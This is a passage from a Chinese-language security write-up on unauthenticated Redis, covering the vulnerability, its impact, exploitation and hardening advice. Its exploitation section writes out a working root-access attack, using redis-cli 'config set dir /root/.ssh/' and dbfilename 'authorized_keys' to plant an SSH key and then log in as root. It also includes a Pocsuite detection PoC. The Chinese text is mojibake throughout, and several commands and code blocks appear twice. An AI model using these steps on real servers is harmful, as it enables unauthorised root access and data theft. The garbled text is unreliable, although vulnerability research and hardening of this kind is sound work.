Redis é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œè¿™æ ·å°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰å¼€å¯è®¤è¯çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨ Redis çš„ç›¸å…³æ–¹æ³•ï¼Œå¯ä»¥æˆåŠŸåœ¨ Redis æœåŠ¡å™¨ä¸Šå†™å…¥å…¬é’¥ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚</p>

<p>1ã€æ¼æ´æè¿°
Redis å®‰å…¨æ¨¡å‹çš„è§‚å¿µæ˜¯: â€œè¯·ä¸è¦å°† Redis æš´éœ²åœ¨å…¬å¼€ç½‘ç»œä¸­, å› ä¸ºè®©ä¸å—ä¿¡ä»»çš„å®¢æˆ·æ¥è§¦åˆ° Redis æ˜¯éå¸¸å±é™©çš„â€ ã€‚</p>

<p>Redis ä½œè€…ä¹‹æ‰€ä»¥æ”¾å¼ƒè§£å†³æœªæˆæƒè®¿é—®å¯¼è‡´çš„ä¸å®‰å…¨æ€§æ˜¯å› ä¸º, 99.99% ä½¿ç”¨ Redis çš„åœºæ™¯éƒ½æ˜¯åœ¨æ²™ç›’åŒ–çš„ç¯å¢ƒä¸­, ä¸ºäº†0.01%çš„å¯èƒ½æ€§å¢åŠ å®‰å…¨è§„åˆ™çš„åŒæ—¶ä¹Ÿå¢åŠ äº†å¤æ‚æ€§, è™½ç„¶è¿™ä¸ªé—®é¢˜çš„å¹¶ä¸æ˜¯ä¸èƒ½è§£å†³çš„, ä½†æ˜¯è¿™åœ¨ä»–çš„è®¾è®¡å“²å­¦ä¸­ä»æ˜¯ä¸åˆ’ç®—çš„ã€‚</p>

<p>å› ä¸ºå…¶ä»–å—ä¿¡ä»»ç”¨æˆ·éœ€è¦ä½¿ç”¨ Redis æˆ–è€…å› ä¸ºè¿ç»´äººå‘˜çš„ç–å¿½ç­‰åŸå› ï¼Œéƒ¨åˆ† Redis ç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œå¹¶ä¸”æ²¡æœ‰å¼€å¯è®¤è¯ï¼ˆè¿™æ˜¯Redis çš„é»˜è®¤é…ç½®ï¼‰ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œå°†ä¼šå¯¼è‡´ Redis æœåŠ¡ç›´æ¥æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå¯¼è‡´å…¶ä»–ç”¨æˆ·å¯ä»¥ç›´æ¥åœ¨éæˆæƒæƒ…å†µä¸‹ç›´æ¥è®¿é—®RedisæœåŠ¡å¹¶è¿›è¡Œç›¸å…³æ“ä½œã€‚</p>

<p>åˆ©ç”¨ Redis è‡ªèº«çš„æä¾›çš„ config å‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„å…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ /root/.ssh æ–‡ä»¶å¤¹çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ç›´æ¥ä½¿ç”¨å¯¹åº”çš„ç§é’¥ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚</p>

<p>2ã€æ¼æ´å½±å“
Redis æš´éœ²åœ¨å…¬ç½‘ï¼ˆå³ç»‘å®šåœ¨0.0.0.0:6379ï¼Œç›®æ ‡IPå…¬ç½‘å¯è®¿é—®ï¼‰ï¼Œå¹¶ä¸”æ²¡æœ‰å¼€å¯ç›¸å…³è®¤è¯å’Œæ·»åŠ ç›¸å…³å®‰å…¨ç­–ç•¥æƒ…å†µä¸‹å¯å—å½±å“è€Œå¯¼è‡´è¢«åˆ©ç”¨ã€‚</p>

<p>é€šè¿‡ZoomEye çš„æœç´¢ç»“æœæ˜¾ç¤ºï¼Œæœ‰97707åœ¨å…¬ç½‘å¯ä»¥ç›´æ¥è®¿é—®çš„RedisæœåŠ¡ã€‚</p>

<p>QQ20151111-0@2x</p>

<p>æ ¹æ® ZoomEye çš„æ¢æµ‹ï¼Œå…¨çƒæ— éªŒè¯å¯ç›´æ¥åˆ©ç”¨Redis åˆ†å¸ƒæƒ…å†µ</p>

<p>3ã€æ¼æ´åˆ†æä¸åˆ©ç”¨
é¦–å…ˆåœ¨æœ¬åœ°ç”Ÿäº§å…¬ç§é’¥æ–‡ä»¶ï¼š</p>

<p>$ssh-keygen â€“t rsa
1
$ssh-keygen â€“t rsa
ssh-keygen</p>

<p>ç„¶åå°†å…¬é’¥å†™å…¥ foo.txt æ–‡ä»¶</p>

<p>$ (echo -e â€œ\n\nâ€; cat id_rsa.pub; echo -e â€œ\n\nâ€) &gt; foo.txt
1
$ (echo -e â€œ\n\nâ€; cat id_rsa.pub; echo -e â€œ\n\nâ€) &gt; foo.txt
å†è¿æ¥ Redis å†™å…¥æ–‡ä»¶</p>

<p>$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
$ redis-cli -h 192.168.1.11
$ 192.168.1.11:6379&gt; config set dir /root/.ssh/
OK
$ 192.168.1.11:6379&gt; config get dir
1) â€œdirâ€
2) â€œ/root/.sshâ€
$ 192.168.1.11:6379&gt; config set dbfilename â€œauthorized_keysâ€
OK
$ 192.168.1.11:6379&gt; save
OK
$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
$ redis-cli -h 192.168.1.11
$ 192.168.1.11:6379&gt; config set dir /root/.ssh/
OK
$ 192.168.1.11:6379&gt; config get dir
1) â€œdirâ€
2) â€œ/root/.sshâ€
$ 192.168.1.11:6379&gt; config set dbfilename â€œauthorized_keysâ€
OK
$ 192.168.1.11:6379&gt; save
OK
redis_ssh</p>

<p>è¿™æ ·å°±å¯ä»¥æˆåŠŸçš„å°†è‡ªå·±çš„å…¬é’¥å†™å…¥ /root/.ssh æ–‡ä»¶å¤¹çš„ authotrized_keys æ–‡ä»¶é‡Œï¼Œç„¶åæ”»å‡»è€…ç›´æ¥æ‰§è¡Œï¼š</p>

<p>$ ssh â€“i  id_rsa root@192.168.1.11
1
$ ssh â€“i  id_rsa root@192.168.1.11
å³å¯è¿œç¨‹åˆ©ç”¨è‡ªå·±çš„ç§é’¥ç™»å½•è¯¥æœåŠ¡å™¨ã€‚</p>

<p>å½“ç„¶ï¼Œå†™å…¥çš„ç›®å½•ä¸é™äº /root/.ssh ä¸‹çš„authorized_keysï¼Œä¹Ÿå¯ä»¥å†™å…¥ç”¨æˆ·ç›®å½•ï¼Œä¸è¿‡ Redis å¾ˆå¤šä»¥ root æƒé™è¿è¡Œï¼Œæ‰€ä»¥å†™å…¥ root ç›®å½•ä¸‹ï¼Œå¯ä»¥è·³è¿‡çŒœç”¨æˆ·çš„æ­¥éª¤ã€‚</p>

<p>4ã€Redis æœªæˆæƒçš„å…¶ä»–å±å®³ä¸åˆ©ç”¨
aï¼‰æ•°æ®åº“æ•°æ®æ³„éœ²
Redis ä½œä¸ºæ•°æ®åº“ï¼Œä¿å­˜ç€å„ç§å„æ ·çš„æ•°æ®ï¼Œå¦‚æœå­˜åœ¨æœªæˆæƒè®¿é—®çš„æƒ…å†µï¼Œå°†ä¼šå¯¼è‡´æ•°æ®çš„æ³„éœ²ï¼Œå…¶ä¸­åŒ…å«ä¿å­˜çš„ç”¨æˆ·ä¿¡æ¯ç­‰ã€‚</p>

<p>redis_user</p>

<p>bï¼‰ä»£ç æ‰§è¡Œ
Rediså¯ä»¥åµŒå¥—Luaè„šæœ¬çš„ç‰¹æ€§å°†ä¼šå¯¼è‡´ä»£ç æ‰§è¡Œ, å±å®³åŒå…¶ä»–æœåŠ¡å™¨ç«¯çš„ä»£ç æ‰§è¡Œ, æ ·ä¾‹å¦‚ä¸‹        ä¸€æ—¦æ”»å‡»è€…èƒ½å¤Ÿåœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œä»»æ„ä»£ç , æ”»å‡»æ–¹å¼å°†ä¼šå˜å¾—å¤šä¸”å¤æ‚, è¿™æ˜¯éå¸¸å±é™©çš„.</p>

<p>redis_lua</p>

<p>é€šè¿‡Luaä»£ç æ”»å‡»è€…å¯ä»¥è°ƒç”¨ redis.sha1hex() å‡½æ•°ï¼Œæ¶æ„åˆ©ç”¨ Redis æœåŠ¡å™¨è¿›è¡Œ SHA-1 çš„ç ´è§£ã€‚</p>

<p>cï¼‰æ•æ„Ÿä¿¡æ¯æ³„éœ²
é€šè¿‡ Redis çš„ INFO å‘½ä»¤, å¯ä»¥æŸ¥çœ‹æœåŠ¡å™¨ç›¸å…³çš„å‚æ•°å’Œæ•æ„Ÿä¿¡æ¯, ä¸ºæ”»å‡»è€…çš„åç»­æ¸—é€åšé“ºå«ã€‚</p>

<p>redis_info</p>

<p>å¯ä»¥çœ‹åˆ°æ³„éœ²äº†å¾ˆå¤š Redis æœåŠ¡å™¨çš„ä¿¡æ¯, æœ‰å½“å‰ Redis ç‰ˆæœ¬, å†…å­˜è¿è¡ŒçŠ¶æ€, æœåŠ¡ç«¯ä¸ªæ•°ç­‰ç­‰æ•æ„Ÿä¿¡æ¯ã€‚</p>

<p>5ã€æ¼æ´éªŒè¯
å¯ä»¥ä½¿ç”¨Pocsuiteï¼ˆhttp://github.com/knownsec/pocsuiteï¼‰æ‰§è¡Œä»¥ä¸‹çš„ä»£ç å¯ä»¥ç”¨äºæµ‹è¯•ç›®æ ‡åœ°å€æ˜¯å¦å­˜åœ¨æœªæˆæƒçš„RedisæœåŠ¡ã€‚</p>

<p>#!/usr/bin/env python</p>
<h1 id="---codingutf-8---">-<em>- coding:utf-8 -</em>-</h1>

<p>import socket
import urlparse
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register</p>

<p>class TestPOC(POCBase):
    vulID = â€˜89339â€™
    version = â€˜1â€™
    author = [â€˜Anonymousâ€™]
    vulDate = â€˜2015-10-26â€™
    createDate = â€˜2015-10-26â€™
    updateDate = â€˜2015-10-26â€™
    references = [â€˜http://sebug.net/vuldb/ssvid-89339â€™]
    name = â€˜Redis æœªæˆæƒè®¿é—® PoCâ€™
    appPowerLink = â€˜http://redis.io/â€™
    appName = â€˜Redisâ€™
    appVersion = â€˜Allâ€™
    vulType = â€˜Unauthorized accessâ€™
    desc = â€˜â€™â€™
        redis é»˜è®¤ä¸éœ€è¦å¯†ç å³å¯è®¿é—®ï¼Œé»‘å®¢ç›´æ¥è®¿é—®å³å¯è·å–æ•°æ®åº“ä¸­æ‰€æœ‰ä¿¡æ¯ï¼Œé€ æˆä¸¥é‡çš„ä¿¡æ¯æ³„éœ²ã€‚
    â€˜â€™â€™
    samples = [â€™â€™]</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def _verify(self):
    result = {}
    payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
    s = socket.socket()
    socket.setdefaulttimeout(10)
    try:
        host = urlparse.urlparse(self.url).netloc
        port = 6379
        s.connect((host, port))
        s.send(payload)
        recvdata = s.recv(1024)
        if recvdata and 'redis_version' in recvdata:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Port'] = port
    except:
        pass
    s.close()
    return self.parse_attack(result)

def _attack(self):
    return self._verify()

def parse_attack(self, result):
    output = Output(self)
    if result:
        output.success(result)
    else:
        output.fail('Internet nothing returned')
    return output
</code></pre></div></div>

<p>register(TestPOC)
#!/usr/bin/env python</p>
<h1 id="---codingutf-8----1">-<em>- coding:utf-8 -</em>-</h1>

<p>import socket
import urlparse
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register</p>

<p>class TestPOC(POCBase):
    vulID = â€˜89339â€™
    version = â€˜1â€™
    author = [â€˜Anonymousâ€™]
    vulDate = â€˜2015-10-26â€™
    createDate = â€˜2015-10-26â€™
    updateDate = â€˜2015-10-26â€™
    references = [â€˜http://sebug.net/vuldb/ssvid-89339â€™]
    name = â€˜Redis æœªæˆæƒè®¿é—® PoCâ€™
    appPowerLink = â€˜http://redis.io/â€™
    appName = â€˜Redisâ€™
    appVersion = â€˜Allâ€™
    vulType = â€˜Unauthorized accessâ€™
    desc = â€˜â€™â€™
        redis é»˜è®¤ä¸éœ€è¦å¯†ç å³å¯è®¿é—®ï¼Œé»‘å®¢ç›´æ¥è®¿é—®å³å¯è·å–æ•°æ®åº“ä¸­æ‰€æœ‰ä¿¡æ¯ï¼Œé€ æˆä¸¥é‡çš„ä¿¡æ¯æ³„éœ²ã€‚
    â€˜â€™â€™
    samples = [â€™â€™]</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def _verify(self):
    result = {}
    payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
    s = socket.socket()
    socket.setdefaulttimeout(10)
    try:
        host = urlparse.urlparse(self.url).netloc
        port = 6379
        s.connect((host, port))
        s.send(payload)
        recvdata = s.recv(1024)
        if recvdata and 'redis_version' in recvdata:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Port'] = port
    except:
        pass
    s.close()
    return self.parse_attack(result)
 
def _attack(self):
    return self._verify()
 
def parse_attack(self, result):
    output = Output(self)
    if result:
        output.success(result)
    else:
        output.fail('Internet nothing returned')
    return output
</code></pre></div></div>

<p>register(TestPOC)
äºŒã€å®‰å…¨å»ºè®®
é…ç½®bindé€‰é¡¹ï¼Œé™å®šå¯ä»¥è¿æ¥RedisæœåŠ¡å™¨çš„IPï¼Œä¿®æ”¹ Redis çš„é»˜è®¤ç«¯å£6379
é…ç½®è®¤è¯ï¼Œä¹Ÿå°±æ˜¯AUTHï¼Œè®¾ç½®å¯†ç ï¼Œå¯†ç ä¼šä»¥æ˜æ–‡æ–¹å¼ä¿å­˜åœ¨Redisé…ç½®æ–‡ä»¶ä¸­
é…ç½®rename-command é…ç½®é¡¹ â€œRENAME_CONFIGâ€ï¼Œè¿™æ ·å³ä½¿å­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œä¹Ÿèƒ½å¤Ÿç»™æ”»å‡»è€…ä½¿ç”¨config æŒ‡ä»¤åŠ å¤§éš¾åº¦
å¥½æ¶ˆæ¯æ˜¯Redisä½œè€…è¡¨ç¤ºå°†ä¼šå¼€å‘â€real userâ€ï¼ŒåŒºåˆ†æ™®é€šç”¨æˆ·å’Œadminæƒé™ï¼Œæ™®é€šç”¨æˆ·å°†ä¼šè¢«ç¦æ­¢è¿è¡ŒæŸäº›å‘½ä»¤ï¼Œå¦‚config</p>

<p>https://help.compose.com/docs/redis-ssh-tunnels</p>
:ET